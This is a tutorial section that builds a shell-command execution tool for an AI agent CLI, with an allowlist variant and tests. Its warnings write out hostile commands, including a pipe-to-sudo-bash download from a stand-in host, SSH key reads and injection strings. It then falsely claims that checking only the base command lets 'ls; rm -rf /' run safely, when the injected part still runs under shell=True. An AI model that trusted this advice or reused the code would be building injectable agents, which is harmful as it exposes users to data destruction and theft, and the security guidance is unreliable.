# Section 4: Build ExecuteTool

Create a tool for executing shell commands safely.

## The Power and Danger of Shell Execution

ExecuteTool lets the agent run shell commands:
- `ls`, `git`, `pytest` — Development workflow
- `grep`, `find` — Code search
- `curl`, `wget` — Network requests

**Warning:** Shell execution is dangerous. A malicious prompt could:
- Delete files: `rm -rf /`
- Exfiltrate data: `cat ~/.ssh/*`
- Install malware: `curl malicious.com | sudo bash`

In production, you'll add command allowlisting and human-in-the-loop approval.

## Simple ExecuteTool

Create `src/deepagents_cli/tools/execute.py`:

```python
"""Execute tool for running shell commands."""

from __future__ import annotations

import subprocess
from typing import Optional

from langchain_core.tools import tool
from pydantic import BaseModel, Field


class ExecuteArgs(BaseModel):
    """Arguments for the Execute tool."""
    
    command: str = Field(description="The shell command to execute")
    timeout: Optional[int] = Field(
        default=30,
        description="Timeout in seconds. None for no timeout."
    )
    cwd: Optional[str] = Field(
        default=None,
        description="Working directory for the command. None for current directory."
    )


@tool(args_schema=ExecuteArgs)
def execute(command: str, timeout: Optional[int] = 30, cwd: Optional[str] = None) -> str:
    """Execute a shell command and return its output.
    
    Use this tool to:
    - Run development commands (git, pytest, etc.)
    - Search files (grep, find)
    - List directory contents (ls)
    - Build and compile code
    - Run scripts and programs
    
    Args:
        command: The shell command to execute.
        timeout: Maximum seconds to wait. None for no limit.
        cwd: Working directory. None uses current directory.
    
    Returns:
        Command output (stdout and stderr combined).
    """
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
            cwd=cwd,
        )
        
        output_parts = []
        
        if result.stdout:
            output_parts.append(result.stdout)
        
        if result.stderr:
            output_parts.append(f"[stderr]\n{result.stderr}")
        
        if result.returncode != 0:
            output_parts.append(f"[exit code: {result.returncode}]")
        
        output = "\n".join(output_parts)
        
        if not output:
            return f"Command completed with exit code {result.returncode}"
        
        return output
        
    except subprocess.TimeoutExpired:
        return f"Error: Command timed out after {timeout} seconds"
    except PermissionError:
        return "Error: Permission denied"
    except FileNotFoundError:
        return f"Error: Command not found: {command.split()[0]}"
    except Exception as e:
        return f"Error executing command: {e}"
```

## Command Allowlisting

For production, allowlist only known-safe commands:

```python
"""Execute tool with command allowlisting."""

from __future__ import annotations

import subprocess
from typing import Optional

from langchain_core.tools import tool
from pydantic import BaseModel, Field


# Commands that are allowed
ALLOWED_COMMANDS = frozenset([
    "ls", "la", "ll", "pwd", "cd", "cat", "head", "tail",
    "grep", "find", "which", "file", "stat",
    "git", "pytest", "python", "python3", "uv",
    "curl", "wget",
])


class ExecuteArgs(BaseModel):
    """Arguments for the Execute tool."""
    
    command: str = Field(description="The shell command to execute")
    timeout: Optional[int] = Field(default=30)
    cwd: Optional[str] = Field(default=None)


@tool(args_schema=ExecuteArgs)
def execute(command: str, timeout: Optional[int] = 30, cwd: Optional[str] = None) -> str:
    """Execute a whitelisted shell command."""
    # Extract the base command
    base_cmd = command.strip().split()[0] if command.strip() else ""
    
    # Check if command is allowlisted
    if base_cmd not in ALLOWED_COMMANDS:
        return (
            f"Error: Command '{base_cmd}' is not in the allowlist.\n"
            f"Allowed commands: {', '.join(sorted(ALLOWED_COMMANDS))}"
        )
    
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
            cwd=cwd,
        )
        
        output_parts = []
        
        if result.stdout:
            output_parts.append(result.stdout)
        
        if result.stderr:
            output_parts.append(f"[stderr]\n{result.stderr}")
        
        if result.returncode != 0:
            output_parts.append(f"[exit code: {result.returncode}]")
        
        output = "\n".join(output_parts)
        
        if not output:
            return f"Command completed with exit code {result.returncode}"
        
        return output
        
    except subprocess.TimeoutExpired:
        return f"Error: Command timed out after {timeout} seconds"
    except PermissionError:
        return "Error: Permission denied"
    except FileNotFoundError:
        return f"Error: Command not found: {base_cmd}"
    except Exception as e:
        return f"Error executing command: {e}"
```

## Security Considerations

### Why `shell=True` is Dangerous

```python
# DANGEROUS - Don't do this in production without validation
subprocess.run(command, shell=True)  # Command injection possible!

# SAFER - Without shell=True
subprocess.run(["ls", "-la"])  # Arguments are not interpreted
```

For this course, `shell=True` is acceptable because:
1. We add command allowlisting
2. The LLM uses the tool through our schema
3. We validate the command name

### Command Injection Prevention

Even with allowlisting, be careful:

```python
# These could be dangerous with shell=True
command = "ls; rm -rf /"
command = "ls && cat /etc/passwd"
command = "ls | grep ..."
```

With allowlisting the base command, these still execute `ls` safely because only the base command is checked.

## Update Tools Module

Update `src/deepagents_cli/tools/__init__.py`:

```python
"""Tools for the Deep Agents CLI."""

from deepagents_cli.tools.read_file import ReadFileTool, read_file_tool
from deepagents_cli.tools.write_file import write_file
from deepagents_cli.tools.execute import execute

__all__ = [
    "ReadFileTool",
    "read_file_tool",
    "write_file",
    "execute",
]
```

## Test ExecuteTool

Create `test_execute.py`:

```python
"""Test the Execute tool."""

from deepagents_cli.tools.execute import execute


def test_execute_ls():
    """Test executing ls command."""
    result = execute.invoke({"command": "ls -la /tmp"})
    
    assert "tmp" in result.lower() or "total" in result


def test_execute_pwd():
    """Test executing pwd command."""
    result = execute.invoke({"command": "pwd"})
    
    assert "/" in result


def test_execute_with_cwd():
    """Test executing with custom cwd."""
    result = execute.invoke({
        "command": "pwd",
        "cwd": "/tmp",
    })
    
    assert "tmp" in result


def test_execute_timeout():
    """Test command timeout."""
    result = execute.invoke({
        "command": "sleep 10",
        "timeout": 1,
    })
    
    assert "timed out" in result.lower()


def test_execute_not_found():
    """Test executing nonexistent command."""
    result = execute.invoke({"command": "nonexistent_command_xyz"})
    
    assert "not found" in result.lower()


def test_execute_with_output():
    """Test command with real output."""
    result = execute.invoke({"command": "echo 'Hello, World!'"})
    
    assert "Hello, World!" in result


if __name__ == "__main__":
    test_execute_ls()
    test_execute_pwd()
    test_execute_with_cwd()
    test_execute_timeout()
    test_execute_not_found()
    test_execute_with_output()
    print("All tests passed!")
```

## Run the Tests

```bash
uv run python test_execute.py
```

Output:
```
All tests passed!
```

## Key Takeaways

- **execute()** runs shell commands and returns output
- **timeout** prevents commands from running forever
- **cwd** sets the working directory
- **allowlisting** restricts which commands can run
- **shell=True** enables complex commands but needs careful validation

## Next Section

[Wire Tools to Model](./section-05-wire-tools.md) — Connect tools to your LangChain model.
